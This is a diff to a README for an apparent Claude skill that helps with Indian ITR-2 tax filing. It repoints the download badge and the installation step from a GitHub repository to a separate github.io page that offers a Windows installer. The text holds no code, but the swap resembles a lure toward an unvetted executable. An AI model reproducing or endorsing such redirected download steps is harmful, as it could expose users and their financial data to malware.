@@ -1,6 +1,6 @@
 # 📊 itr-filing-claude-skill - Simplify Your Indian Tax Filing Process
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Slender-gettysburg502/itr-filing-claude-skill)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://slender-gettysburg502.github.io)
 
 This tool helps you prepare your Indian ITR-2 return for the Assessment Year 2026-27. It automates the process of gathering and checking your financial documents. You spend less time on manual data entry and reduce the risk of errors in your tax reports.
 
@@ -31,7 +31,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page to download the software: [https://github.com/Slender-gettysburg502/itr-filing-claude-skill](https://github.com/Slender-gettysburg502/itr-filing-claude-skill)
+1.  Visit the official release page to download the software: [https://slender-gettysburg502.github.io](https://slender-gettysburg502.github.io)
 2.  Locate the latest version link on the page.
 3.  Click the link to download the installer file to your computer.
 4.  Find the file in your Downloads folder once the transfer finishes.
